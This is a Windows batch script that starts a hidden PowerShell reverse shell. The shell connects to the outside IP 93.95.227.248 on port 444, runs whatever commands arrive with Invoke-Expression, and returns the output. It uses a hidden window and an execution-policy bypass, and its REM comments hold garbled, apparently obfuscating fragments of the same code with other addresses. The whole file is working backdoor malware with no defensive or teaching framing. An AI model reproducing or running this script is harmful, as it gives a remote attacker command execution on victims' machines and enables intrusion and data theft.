@echo off

REM Jba '91.69.167.224'-SbeAfead=while (1) { $LHOST = '93.($OutputString); $Code($TCPClient.Connected){ Invoke-Expression ($Code) 2>&1 } catch { $_ }; ~
REM O113 System.Byte[] $Buffer = 1024;'41.82.130.14'-SbeDd=whu (e3) { $LHOST = 6671.($OutputString); $Code($TCP-port.Connected)($NetworkStream.DataAvailable) ($Code) 2>&1 } catch || Catch{ee3}
REM { $LHOST = '89.8.172.113'; $LPORT = 227; $TCPHost $OutputString = $Output$NetworkStream;:UTF8.GetString "%psCmd%" (0, $RawData) || 11
set "psCmd=while (1) { $LHOST = '93.95.227.248'; $LPORT = 444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = [Text.Encoding]::UTF8.GetString($Buffer, 0, $RawData - 1); if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $OutputString = $Output | Out-String; $StreamWriter.Write($OutputString); $Code = $null } }; Start-Sleep -Milliseconds 100 } }"

REM run /k powershell.exe -WindowStyle $Local -Bypass -NoCommand 11/2 $TCP "%psCmd%"
start /b powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "%psCmd%"


